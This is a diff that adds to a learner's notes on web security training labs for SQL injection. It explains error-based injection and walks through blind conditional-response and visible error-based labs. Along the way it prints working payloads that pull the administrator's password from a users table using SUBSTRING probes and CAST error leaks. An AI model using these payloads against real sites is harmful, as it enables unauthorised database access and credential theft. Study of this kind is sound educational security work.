@@ -196,3 +196,100 @@ TrackingId=fNg3RnqiOBbPgwwI'AND (SELECT 'b' FROM users WHERE username='administr
 This returns us Welcome back assuming that it is true but when we put in 20 we don't have it anymore. Just to be sure, we can change to = ->
 
 <figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+#### Error-based SQL injection
+
+It's when you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.
+
+* Return a specific error response based on the result of a boolean expression.
+* Trigger error messages that output the data returned by the query
+
+
+
+### Lab: Blind SQL injection with conditional responses
+
+We're able to make an error with a single quote on the tracking ID:
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+We can test out the bounderies of this injection with TRUE & FALSE conditions:
+
+```
+' AND '1'='1
+' AND '1'='2
+```
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>True statement</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>False statement</p></figcaption></figure>
+
+Since we have the name of the tables and columns to exploit, we can make the correct query:
+
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm
+```
+
+1. **SELECT password FROM users WHERE username = 'administrator'**: This is a SQL query selecting the password from a table called 'users' where the username is 'administrator'. It's attempting to retrieve the password associated with the administrator account.
+2. **SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1)**: This part of the expression is attempting to extract a substring from the password selected in the previous step. It's grabbing the first character of the password.
+3. **> 'm'**: This is a conditional statement comparing the first character of the password to the letter 'm'. If the ASCII value of the first character of the password is greater than the ASCII value of 'm', the condition will be true.
+
+
+
+#### Extracting sensitive data via verbose SQL error messages
+
+Misconfiguration of the database sometimes results in verbose error messages, ex:
+
+```
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+
+We can see that in this case, we're injecting into a single-quoted string inside a `WHERE` statement. This makes it easier to construct a valid query containing a malicious payload.
+
+You can use the `CAST()` function to convert one data type to another. For example, imagine a query containing the following statement:
+
+```
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+### Lab: Visible error-based SQL injection
+
+we are able to trigger an error with a single quote on the tracking id:
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+If we use the CAST command, we get a different error:
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+If we input this query, we do not have any errors anymore&#x20;
+
+```
+' AND 1=CAST((SELECT 1 ) AS int)--
+```
+
+`AND 1=CAST((SELECT 1 ) AS int)`: This is the injected SQL code. It attempts to manipulate the SQL query's logic to always evaluate to true. It checks if 1 is equal to the result of casting the value 1 as an integer. This condition will always be true.
+
+But if we try to adapt and put:
+
+<figure><img src="../.gitbook/assets/2024-04-19_11-12.png" alt=""><figcaption></figcaption></figure>
+
+we see the query is cut to a certain point, so we need to free some space by reducing the initial tracking ID
+
+```
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+<figure><img src="../.gitbook/assets/2024-04-19_11-19.png" alt=""><figcaption></figcaption></figure>
+
+The error is different, so now we can try printing out the password:
+
+<figure><img src="../.gitbook/assets/2024-04-19_11-29.png" alt=""><figcaption></figcaption></figure>
+
+and just like that we are able to connect to the admin account
+
+final payload:
+
+```
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
